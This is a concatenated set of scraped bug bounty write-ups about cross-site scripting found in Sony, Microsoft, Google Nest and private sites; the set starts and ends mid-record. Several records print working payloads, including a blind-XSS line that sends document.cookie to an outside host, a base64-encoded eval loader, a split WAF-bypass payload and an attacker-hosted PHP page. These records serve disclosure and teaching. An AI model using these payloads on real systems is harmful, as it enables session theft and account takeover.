it will read the cookie from the DOM send to the remote server. Revised payload : <script src=//ł.rip> The cookies will be saved in logs.txt file in the remote server, we can capture mouse movement, keystrokes as well. And then I confirmed the working of the script by executing at my own end and here we go. Biscuits coming to our remote server. Now opening logs.txt, just to confirm the cookies. So yeah!!! Our own XSS hunter !!! Sad part… The sad part of this story is, the XSS never got executed in the shop admin dashboard/backend but I believe I was on the right path, it was worth attempting. Reward: EXPERIENCE Bug Bounty Post navigation Older post Subdomain takeover via pantheon Newer post Misconfigured WordPress takeover to Remote Code Execution 7 Comments abfar LY says: March 8, 2020 at 6:25 am very sad story, but you said it …. you gained experience. good luck next bug! Reply Rahul Bhichher says: June 25, 2020 at 8:05 pm Wow man!! Money is not everything. Kudos for Experience!❤️ Reply smaran.chand says: June 27, 2020 at 4:13 pm Yeah, indeed! Reply Pingback: These Bug Bounty Writeups will Change Your Life - PrimeHackers mrtechghost says: March 6, 2021 at 10:56 am Great learning…!!! Reply 1 says: June 18, 2024 at 4:57 am nice 1 Reply Pingback: Awesome Bugbounty Writeups – OsayWorld Leave a Comment Cancel reply Your email address will not be published. Required fields are marked * Comment * Name * Email * Website Save my name, email, and website in this browser for the next time I comment. Notify me of follow-up comments by email. Notify me of new posts by email. Δ Facebook | Twitter"}
{"source_url": "https://hazana.xyz/posts/escalating-reflected-xss-with-http-smuggling/", "title": "Untitled", "friendly_explanation": "This is a bug bounty writeup from https://hazana.xyz/posts/escalating-reflected-xss-with-http-smuggling/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n"}
{"source_url": "https://medium.com/@gguzelkokar.mdbf15/xss-on-sony-subdomain-feddaea8f5ac", "title": "XSS on Sony subdomain. Hi guys. This is my first bug bounty… | by Gökhan Güzelkokar | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@gguzelkokar.mdbf15/xss-on-sony-subdomain-feddaea8f5ac. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS on Sony subdomain. Hi guys. This is my first bug bounty… | by Gökhan Güzelkokar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS on Sony subdomain Gökhan Güzelkokar 2 min read · Jan 6, 2020 -- 8 Listen Share Press enter or click to view image in full size Hi guys. This is my first bug bounty writeup. I started to bug bounty on july 22, 2019. I want to share with community all the vulnerabilities I have found. I choose for large scope programs when looking for bug bounty programs and for improve myself I don’t care about bounty now. So I chose SONY. I started with subdomain enumaration. Firstly, I used crt.sh and I use the following to find potential sub-domains. ##N ow does not support :( %my%.sony.net %jira%.sony.net %jenkins%.sony.net %test%.sony.net %staging%.sony.net %corp%.sony.net %api%.sony.net %ws%.sony.net %.%.%.sony.net Sometimes just random letters.. %p%.sony.net %i%.sony.net %ff%.sony.net %co%.sony.net Press enter or click to view image in full size crt.sh I found this one ( ppf.sony.net ). Then, I used assetfinder and httprobe by tomnomnom for subdomain enumeration and I found a deep sub-domain. Here is our target sub-domain. authtry.dev2.sandbox.dev.ppf.sony.net assetfinder -subs-only ppf.sony.net | httprobe authtry.dev2.sandbox.dev.ppf.sony.net Then, I used dirsearch for secret directories. The default page appeared. dirsearch.py -u “authtry.dev2.sandbox.dev.ppf.sony.net” -e html,json,php -x 403,500 -t 50 Press enter or click to view image in full size Also, phpinfo is an information disclosure. I submitted another report When I visit to index.php I got this page. Press enter or click to view image in full size As you can see we have 2 parameters and if you have parameters on the empty page, firstly try to get XSS. I tried get xss on the page and I got !! Also my favorite payload : <img onerror=”{alert`1`}” src> Press enter or click to view image in full size Thank you !!! Security Xss Bugbounty Bugs Bugbountytip -- -- 8 Written by Gökhan Güzelkokar 2K followers · 161 following https://twitter.com/gkhck_ Responses ( 8 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8", "title": "Reflected XSS on Microsoft.com via Angular Js template injection | by Pratik Dabhi | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@impratikdabhi/reflected-xss-on-microsoft-com-via-angular-template-injection-2e26d80a7fd8. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS on Microsoft.com via Angular Js template injection | by Pratik Dabhi | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Reflected XSS on Microsoft.com via Angular Js template injection Pratik Dabhi 3 min read · May 2, 2020 -- 1 Listen Share Press enter or click to view image in full size I got lots of message for Microsoft POC on Instagram and whatsapp also So i think write a blog for it. Summary:- Client-side template injection vulnerabilities arise when applications using a client-side template framework dynamically embed user input in web pages. When a web page is rendered, the framework will scan the page for template expressions, and execute any that it encounters. An attacker can exploit this by supplying a malicious template expression that launches a cross-site scripting (XSS) attack. As with normal cross-site scripting, the attacker-supplied code can perform a wide variety of actions, such as stealing the victim’s session token or login credentials, performing arbitrary actions on the victim’s behalf, and logging their keystrokes. Browser cross-site scripting filters are typically unable to detect or prevent client-side template injection attacks. I started my hunting on Microsoft from finding subdomains I got my target site which is https://flow.microsoft.com/ with some advance recon also Here i noted some points like which technology used by that websites Press enter or click to view image in full size Angular templates can contain expressions — JavaScript-like code snippets inside double curly braces. To see how they work have a look at the following jsfiddle: http://jsfiddle.net/2zs2yv7o/ The text input {{7*7}} is evaluated by Angular, which then displays the output: 49. This means anyone able to inject double curly braces can execute Angular expressions. then start sort out the parameters and find out which is “filter” i used xss payload but no payload is working here :( Then i manually checked where it values reflected in sources code then i realize that its by recon and source code reading that it is use a angular template and found a version of that template and search a payload for that here i got that payload Press enter or click to view image in full size then i use Google for it and https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs Press enter or click to view image in full size Video poc:- And Finally, I got Microsoft Hall of Fame. https://portal.msrc.microsoft.com/en-us/security-guidance/researcher-acknowledgments-online-services?rtc=1 Press enter or click to view image in full size Timeline : 13-July-2019 — Report 18-July-2019 — Triaged 28-July-2019 — Valid & Fixed 20-August-2019 — Hall Of Fame Thanks, everyone for reading:) Happy Hacking ;) Support me if you like my work! Buy me a coffee and Follow me on twitter . impratikdabhi Hey, 👋 I just created a page here. You can now buy me a coffee! www.buymeacoffee.com Website:- https://www.pratikdabhi.com/ Instagram:- https://www.instagram.com/i.m.pratikdabhi Twitter:- https://twitter.com/impratikdabhi Youtube:- https://www.youtube.com/impratikdabhi Hall Of Fame Bug Bounty Hackerone Bugcrowd Penetration Testing -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Pratik Dabhi 2.9K followers · 28 following Solution Delivery Analyst at @Deloitte India (Offices of the US) | Pentester | Bugcrowd Top 200 Hackers Globally | SRT | Youtuber | Synack Envoy | CEH | eJPT Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/reflected-xss-on-microsoft-com-subdomains-4bdfc2c716df", "title": "Reflected XSS on microsoft.com subdomains | by Raimonds Liepins | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/reflected-xss-on-microsoft-com-subdomains-4bdfc2c716df. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS on microsoft.com subdomains | by Raimonds Liepins | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Reflected XSS on microsoft.com subdomains Raimonds Liepins 3 min read · Mar 19, 2020 -- 2 Listen Share Microsoft replied that this is out of scope of their security program as well as not deemed this as a security vulnerability at all, so I am going to do a write-up about this. “ This does not meet the bar for security servicing as it requires a user copy and paste malicious code into a text field or modify user-side code/traffic. Self targeting attacks like this are not considered a security vulnerability as it requires social engineering to target another user.” UPDATE 3/24/2020: Microsoft actually re-assessed the rejected vulnerabilities on 23rd of March and these issues actually do meet their bar for service. Since I am all about responsible disclosure the details are removed until they are patched. “This submission was incorrectly assessed as self-XSS instead of reflected XSS. It was later informed to us that these do meet the bar for service.” With this vulnerability I actually got into Microsoft’s newbie hall of fame on March 2020 section. Lesson learned from this experience is that you should never ever submit reflected XSS to Microsoft without a proper escalation and you can trust me that there was a lot of possibility for that, as described in the article below. Affected domains: activateuat.microsoft.com gallery.technet.microsoft.com ppe.gallery.technet.microsoft.com ppe.code.msdn.microsoft.com What can you do with a reflected XSS? If an attacker can control a script that is executed in the victim’s browser, then they can typically fully compromise that user. Among other things, the attacker can: - Perform any action within the application that the user can perform. - View any information that the user is able to view. - Modify any information that the user is able to modify. - Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user. What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy In this section, we'll explain what cross-site scripting is, describe the different varieties of cross-site scripting… portswigger.net Finding vulnerabilities: Finding vulnerabilities like these is not hard. I ran the following command: assetfinder -subs-only microsoft.com | httprobe | cookieless assetfinder https://github.com/tomnomnom/assetfinder httprobe https://github.com/tomnomnom/httprobe cookieless https://github.com/RealLinkers/cookieless The last github repository is a tool created by me to automate manual testing process. Hopefully it is useful for other researches as well. What is cookieless and how do you turn that into reflected XSS? Essentially this only works for .NET websites if the developers used a tilde symbol to resolve a resource <script src=”<%= ResolveUrl(“~/Script.js”) %>”></script> The cookieless part of the URL which in the following example is (A(ABCD)) is in no way htmlencoded by design, letting an attacker escape the context of the HTML tag in the following url https://gallery.technet.microsoft.com/(A(ABCD))/ that will translate to <script src=”/(A(ABCD))/Script.js”> Not all characters are supported, but with enough tinkering you can find a way to get the alert to popup. Obviously if you are an attacker you can do much more than an alert as previously described. https://gallery.technet.microsoft.com/(A(%22onerror='alert%601%60'testabcd))/ Since some of these domains don’t even have a Content-Security-Policy you can actually include scripts from 3rd party locations, bypassing the restrictions that you would have defined within the scope of URL length and characters allowed by cookieless identifier. For a much deeper dive into this please refer to this amazing article https://blog.isec.pl/all-is-xss-that-comes-to-the-net/ and Microsoft’s documentation: https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.sessionstatesection.cookieless?view=netframework-4.8 Disclosure timeline: March 17/2020 Submitted vulnerability to Microsoft MSRC March 19/2020 Public disclosure as deemed not a vulnerability by Microsoft MSRC March 23/2020 Public disclosure hidden since Microsoft MSRC reassessed the vulnerabilities and they do in fact meet their bar for service Issues have been addressed Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub… medium.com Microsoft Cross Site Scripting Bugs Penetration Testing Security -- -- 2 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Raimonds Liepins 69 followers · 5 following Opinions are my own and not the views of my employer Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229", "title": "XSS WAF & Character limitation bypass like a boss | by Prial Islam Khan | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/xss-waf-character-limitation-bypass-like-a-boss-2c788647c229. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS WAF & Character limitation bypass like a boss | by Prial Islam Khan | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication XSS WAF & Character limitation bypass like a boss Prial Islam Khan 4 min read · Mar 27, 2020 -- 6 Listen Share H ello Fellow Hackers! I am sitting in my room for last 3 days due to corona virus outbreak world wide and feeling really bored . So I thought why not do a write-up what I promised really long ago 🤭. Few months back in My Tweet I shared a way to bypass XSS WAF & Character limitation what I found on a private bug bounty site. Today I will share more technical details about that bypass . Hope you guys will enjoy it 😇 Back in 2019 I was testing a web application what allows a user to create a photo album and upload photos in it and the interface looks like below screenshot - Press enter or click to view image in full size Application Interface 🤔 Also there is option to rename images when I click on Edit , So normally any researcher will test for XSS here as there is a way to change the photo name . So I changed the photo name to below payload - xsstest'\">{{7*7}} Then I noticed following things - There is 15 character limitation in that input so I was able to inject xsstest'\">{{7*7 these characters . All special characters was being escaped properly . And at last I was being redirected to /error.aspx?code=500 when I tried to load that album again due to WAF and I have to rename the image to xsstest then I was able to load the album again . It looks like this input is well protected form XSS attacks . Then I start playing with other available options and connected Burp Suit tools with my browser and keep it open to capture all background requests in HTTP History . Then when I was going through HTTP History tab and one background request endpoint caught my attention what looks like https://subdomain.company.com/ajax/generateImageList.ashx?json={albums:[{\"id\":\"<picture_ID>\",\"value\":\"on\"}]} . This request was for album Slideshow option and that endpoint page source was :- <a href=\"https://image-link.com/image.jpg\" title=\"xsstest\" rel=\"lightbox[gallery]\">84**00000</a> Look at the title attribute value what is our image name in that album . So again I renamed my picture name to xsstest'\"> and again checked ajax/generateImageList.ashx page source and this time it was - <a href=\"https://image-link.com/image.jpg\" title=\"xsstest'\">\" rel=\"lightbox[gallery]\">84**00000</a> So in this new generateImageList.ashx endpoint - Users input is not being escaped properly . No WAF detection . But we still have the 15 character limitation what makes this xss useless . The smallest xss payload we can think of for this scenario is \"oncut=\"alert() Which will result a blank popup when we Press CTRL+X on Windows & COMMAND+X on OS X on keyboard :- <a href=\"https://image-link.com/image.jpg\" title=\"\"oncut=\"alert()\" rel=\"lightbox[gallery]\">84**00000</a> Press enter or click to view image in full size Blank Popup 😪 I tried all possible way to bypass this character limitation and was unable to do it . I stopped testing here and saved about this endpoint in my To do list note to take a look here when I again test this asset . After about seven months I again started testing this asset and again working on this endpoint . Now noticed that I can upload multiple photos on album and by selecting all photos of album the Slideshow option request endpoint changes to https://subdomain.company.com/ajax/generateAlbumImageList.ashx?json={albums:[{\"id\":\"<album_ID>\",\"value\":\"on\"}]} and that page source is :- <a href=\"https://image-link.com/image.jpg\" title=\"xsstest'\">\" rel=\"lightbox[gallery]\">84**00000</a><a href=\"https://image-link.com/image.jpg\" title=\"xsstest'\">\" rel=\"lightbox[gallery]\">84**00001</a> So now we have multiple injections here . So why not uplaod 5 pictures in the album and use My Tweet mentioned payload ? Payload : 1st Injection: */</script><!-- 2nd Injection: */.domain)/*xxx 3rd Injection: */(document/*xx 4th Injection: */prompt/*xxxxx 5th Injection: \"><script>/*xss Page source after final injection become :- <a href=\" https://image-link.com/image.jpg \" title=\" \"><script>/*xss \" rel=\"lightbox[gallery]\">84**00000</a><a href=\" https://image-link.com/image.jpg \" title=\" */prompt/*xxxxx \" rel=\"lightbox[gallery]\">84**00001</a><a href=\" https://image-link.com/image.jpg \" title=\" */(document/*xx \" rel=\"lightbox[gallery]\">84**00002</a><a href=\" https://image-link.com/image.jpg \" title=\" */.domain)/*xxx \" rel=\"lightbox[gallery]\">84**00003</a><a href=\" https://image-link.com/image.jpg \" title=\" */</script><!-- \" rel=\"lightbox[gallery]\">84**00004</a> Now visiting https://subdomain.company.com/ajax/generateAlbumImageList.ashx?json={albums:[{\"id\":\"<album_ID>\",\"value\":\"on\"}]} will execute the payload we used :- Press enter or click to view image in full size Boom 😎🔥 Now you may have question why I used x character multiple time in 2nd to 5th payload ? The answer is in album images are sorting based on the name length + When it was uploaded . So I used x character multiple time to make all image name length same, so-that when I upload images it sort based on image upload time . Hope you guys enjoyed this one . PM me at Twitter or Facebook anytime if you have any questions . #Stay_Home #Stay_Safe #Wash_Your_Hand_Frequently #Hack_The_Planet 🔥 Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub… medium.com Bug Bounty Xss Bypass Xss Attack Cross Site Scripting -- -- 6 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Prial Islam Khan 1.1K followers · 258 following A teenager boy with passion of Breaking Security . Responses ( 6 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68", "title": "Stored XSS in Google Nest. Welcome All ! :) This is my first… | by Harikrishnan Chandraganesan | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/stored-xss-in-google-nest-a82373bbda68. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS in Google Nest. Welcome All ! :) This is my first… | by Harikrishnan Chandraganesan | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Stored XSS in Google Nest Harikrishnan Chandraganesan 2 min read · Apr 7, 2020 -- 3 Listen Share Welcome All ! :) This is my first writeup, first blog, first publication, whatever… Lets get straight to the bug. While testing Google Nest for bugs, I have found a stored XSS in https://store.nest.com/ . Actually this is an accidental XSS. :P I have tested many input fields for XSS and left the tabs opened. After sometime I just left the home.nest.com subdomain and went for the store.nest.com . While changing the home1 to home2 , i just refreshed the page and got a popup. I was like… Random Vadivelu GIF for expressing happiness :P Proof of Concept sent to Google : Timeline : Mar 17, 2019 - Bug Reported to Google Mar 19, 2019 - Status changes to Not Reproducible | Explained how to reproduce the bug Mar 26, 2019 - Nice Catch! from Google ❤ Apr 9, 2019 - Bounty Awarded $$$ So, this was my first bounty from Google. I have reported other minor issues and got hall of fame. But getting a bounty from google is a long time goal for me. Even though the bounty is less but it felt more happiness than the monthly salary of my daily job :) You can see many writeups coming up in the next few days. Thanks for Reading :) Bella Ciao ! Bug Bounty Vulnerability Assessment Infosec -- -- 3 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Harikrishnan Chandraganesan 77 followers · 9 following Beginner in InfoSec | Computerist ❤ Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://footstep.ninja/posts/exploiting-self-xss/", "title": "cat ~/footstep.ninja/blog.txt", "friendly_explanation": "This is a bug bounty writeup from https://footstep.ninja/posts/exploiting-self-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\ncat ~/footstep.ninja/blog.txt cat ~/footstep.ninja/blog.txt where I share my findings and whatnot Posts About Me Hall of Fame Exploiting a Self Stored XSS with an IDOR Dec 31, 2019 2 min read In this post, I’ll be talking about an interesting bug chain I discovered a few months ago; Stored XSS + IDOR (Cross Site Scripting and Insecure Direct Object Reference respectively). The target is an application that helps manage finances. Before finding this particular bug chain, I had discovered and reported a few IDORs in the application which were already fixed and paid within 30 minutes. Then it occured to me that some of the IDORs are sitewide and they also fixed it too. Cross Site Scripting They have a feature to request suppliers in the application. So, I injected a XSS payload in the “Name of supplier” and requested the supplier. Nothing happened at first until I opted to delete the supplier and got a pop-up! That was successful but this doesn’t seem exploitable as it was Stored but Self XSS. PS: I didn’t include the payload here since anyone would have worked. Insecure Direct Object Reference Although I know they had fixed some IDORs in the past, but wanted to escalate the Stored Self XSS anyway. Luckily for me, I found another IDOR which was not handled by the previous fix. This time I was able to view, edit, and delete suppliers of other users. The body of the PUT request looked like the following: {\"shop_account_request\":{\"request_name\":\"Name of supplier\",\"reference_contact_name\":\"ContactName\",\"reference_contact_email\":\"Email\",\"reference_contact_phone\":\"Phone\",\"id\":IncrementalID}} Then I could set a XSS payload as the “Name of supplier” for any of the request for supplier via the Incremental IDs. And whenever they feel a name is weird and opt to delete, the XSS payload would be executed. Thank you for your time. And I hope you enjoyed reading this. Share on IDOR via Websockets Story of an IDOR via HTTP Copyright © 2020 - Shuaib Oladigbolu | Rendered by Hugo | Subscribe"}
{"source_url": "https://jinone.github.io/bugbounty-a-dom-xss/", "title": "BugBounty | A Dom Xss – Jinone – 败絮其中", "friendly_explanation": "This is a bug bounty writeup from https://jinone.github.io/bugbounty-a-dom-xss/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBugBounty | A Dom Xss – Jinone – 败絮其中 Jinone 败絮其中 Blog About Archive Tags BugBounty | A Dom Xss 2019-12-24 bugbounty Xss I was working on a private program which i cannot disclose I checked the js file by the way when I checked the request. Found a suspicious piece of code www.xxxxx.com domain /xxxxxxxxx/ path https://www.xxxxx.com/xxxxxxxxx/pdp.min.js Vuln code ajax Get request response write to page Normal request looks like this Visit this site https://www.xxxxx.com/xxxxxxxxx ajax will make such a request https://www.xxxxx.com/xxxxxxxxx/showProductRedemption?productCode=263625 var prefix = location.pathname; var url = prefix + \"/showProductRedemption?productCode=\" + vpCode; $.ajax({ url: url, type: \"GET\", dataType: \"html\", success: function(res) { PDP.AjaxResponse.showProductRedemption(res); }, error: function(res) { console.error(res); } }); But location.pathname attackers can control So when location.pathname is set to //attacker.com The browser will go to attacker.com This will visit the attacker’s website to get their website content POC https://www.xxxxx.com//attacker.com/xxxxxxxxx location.pathname is //attacker.com/xxxxxxxxx //attacker.com = https://attacker.com ajax will request https://attacker.com/xxxxxxxxx for the response content Attackers just need to set up their own website content After Ajax gets the response from the attacker’s website, it will write xsspayload to the page An example with php <?php header(\"Access-Control-Allow-Origin: *\"); header(\"Access-Control-Allow-Credentials: true\"); header(\"Access-Control-Request-Methods:GET, POST, PUT, DELETE, OPTIONS\"); echo '<script>alert(1);</script>'; ?> So when the user visits https://www.xxxxx.com//attacker.com/xxxxxxxxx Will trigger this dom xss Finally Thanks!  BugBounty | A Simple SSRF 基于dom的一些前端漏洞  © 2020 Jinone"}
{"source_url": "https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678?", "title": "Blind Xss (A mind game to win the battle) | by Dirtycoder | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@dirtycoder0124/blind-xss-a-mind-game-to-win-the-battle-4fc67c524678?. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBlind Xss (A mind game to win the battle) | by Dirtycoder | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Blind Xss (A mind game to win the battle) Dirtycoder 2 min read · Dec 11, 2019 -- 2 Listen Share In this write-up, I will explain how I exploited a blind XSS in the backend portal of a program. I will not take much time and keep the write-up simple and point to point. It was a private program so we will call it https://redacted.com. I used https://blindf.com in order to exploit it. It's a platform/tool/framework to find blind XSS. Attack Starts: Found a form on https://redacted.com I put Bhtml payload + BXSS payload in the text field Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\"></script><script src=https://blindf.com/bx.php></script> Result: WAF stopped me to submit the form. 3. I removed the BXSS payload. Now the payload was Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/> Result: WAF did not stop me and I successfully submitted the form. Next day Blindf confirmed the BHTML payload execution in the backend. Now It’s time to submit the Bxss payload. Because I knew that the backend portal is vulnerable and I just have to submit the Bxss payload. 4. Next Payload used. BHTML + BXSS Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\"><svg onload='with(top)body.appendChild(createElement(\"script\")).src=\"https://blindf.com/bx.php\"'> Result: WAF did not stop me and I successfully submitted the payload. But again only BHTML payload worked and BXSS did not. Now again, its time to modify the payload. 5. Next payload used. BHTML + BXSS Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\"> sfds\"><base href=\"https://blindf.com\"><script nonce='secret' src='./bx.php'></script> Result: WAF stopped me and I could not submit the form. Frustration was on the peak. Again its time to change the payload. 6. Next payload used. BHTML + BXSS Payload: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\">\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmxpbmRmLmNvbS9ieC5waHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))> Result: Bypassed the WAF but again only BHTML worked and BXSS failed. Now it was not the time of payload modification but thinking about the situation. Situation step by step: I used BHTML + BXSS payloads. Some Bxss payloads bypassed the WAF but did not execute in the backend portal where Bhtml payloads were going well and I was receiving back response from my BHTML payloads. Maybe something was stopping my remote js file from execution. [CORS or Same-origin policy] So I have to execute BXSS without including remote js file. But how can I confirm the payload execution in the backend if I just show an alert popup to them “<img” tag was working but I could not include remote js file. I have to make a payload that can respond back and confirm js code execution. 7. Now it’s time to modify the payload and attack again. Payload used: <img src=\"https://blindf.com/b.php?c=redacted_bhtml_execution\"/>\"> <img src=https://blindf.com/a.jpg onload=this.src='https://blindf.com/oc.php/?c='+document.cookie> Result: WAF bypassed. Bhtml payload executed. Bxss payload executed and I got the cookie value. Severity: Critical (9 ~ 10) Bounty: $1000 JavaScript Blind Xss Stored Xss HTML Xss Bypass -- -- 2 Written by Dirtycoder 205 followers · 5 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/", "title": "How We Found Another XSS in Google with Acunetix | Acunetix", "friendly_explanation": "This is a bug bounty writeup from https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow We Found Another XSS in Google with Acunetix | Acunetix Get a demo Toggle navigation Get a demo Product Why Acunetix? Solutions INDUSTRIES IT & Telecom Government Financial Services Education Healthcare ROLES CTO & CISO Engineering Manager Security Engineer DevSecOps Case Studies Customers Testimonials Pricing About Us Our story In the news Careers Contact Resources Blog Webinars White papers Buyer’s guide Partners Documentation Get a demo THE ACUNETIX BLOG Web Security Zone How We Found Another XSS in Google with Acunetix Andrey Leonov | February 17, 2020 You have to be a very lazy hacker not to try to find issues in Google. Link and I are not lazy but we may be a bit luckier than most. And we use good tools, which helps. Some time ago, we found an XSS in Google Cloud with the help of the Acunetix vulnerability scanner . Recently we found another XSS vulnerability. Here is how it happened. Step 1. A Report from the Vulnerability Scanner As part of our research, we regularly scan various Google services using different tools, including Acunetix. We simply have a long list of targets and go through each of them. One of such target scans in December 2019 resulted in the scanner reporting an XSS with the following payload: https://google.ws/ajax/pi/fbfr?wvstest=javascript:domxssExecutionSink(1,%22%27%5C%22%3E%3Cxsstag%3E()locxss%22) Such reports sometimes turn out to be false positives and we don’t react to them every time but this was Google. So it was very much worth having a deeper look. Step 2. Analyzing the HTTP Response The first step was to examine the HTTP response in detail: HTTP/1.1 200 OK ... <!doctype html><div style=\"display:none\"> <form method=\"post\"> </form> <script nonce=\"+ao+4Egc+7YExl3qyyWMJg==\">(function(){var a=window.document.forms[0],b=location.hash.substr(1);b||window.close();var c=b.split(\"&\"),d=decodeURIComponent(c[0]);a.action=d;for(var e=1;e<c.length;e++){var f=c[e].split(\"=\"),g=document.createElement(\"input\");g.type=\"hidden\";g.name=f[0];g.value=decodeURIComponent(f[1]);a.appendChild(g)}a.submit();}).call(this);</script> </div> This response seemed to contain an empty form and a bit of JavaScript code. To understand it better, we made it more readable: (function() { var a = window.document.forms[0], b = location.hash.substr(1); b || window.close(); var c = b.split(\"&\"), d = decodeURIComponent(c[0]); a.action = d; for (var e = 1; e < c.length; e++) { var f = c[e].split(\"=\"), g = document.createElement(\"input\"); g.type = \"hidden\"; g.name = f[0]; g.value = decodeURIComponent(f[1]); a.appendChild(g) } a.submit(); }).call(this); Next, we tried to understand every step of the above JavaScript code. See the comments within the code to understand how it works. (function() { // Function that is going to be auto-executed }).call(this); (function() { // The variable “a” points to a form that is empty right now var a = window.document.forms[0], // The variable b is a location hash without the # character b = location.hash.substr(1); // If there is no b (no hash in the location URI), try to self-close b || window.close(); // Split the location hash using the & character var c = b.split(\"&\"), // And decode the first (zero) element d = decodeURIComponent(c[0]); // The hash value becomes the action of the form a.action = d; // The below content is not important in the context of the issue for (var e = 1; e < c.length; e++) { var f = c[e].split(\"=\"), g = document.createElement(\"input\"); g.type = \"hidden\"; g.name = f[0]; g.value = decodeURIComponent(f[1]); a.appendChild(g) } // The form is auto-submitted a.submit(); }).call(this); Step 3. The Proper Payload Once we understood how the function works, all we needed is a proper payload. We came up with the following one: https://google.ws/ajax/pi/fbfr#javascript:alert(document.cookie) We also decided to see if this vulnerability affects other Google domains: https://google.com/ajax/pi/fbfr#javascript:alert(document.cookie) The Fix Google did not have to work hard on fixing the issue. Only one line of code had to be changed to eliminate the vulnerability: (function() { var a = window.document.forms[0], b 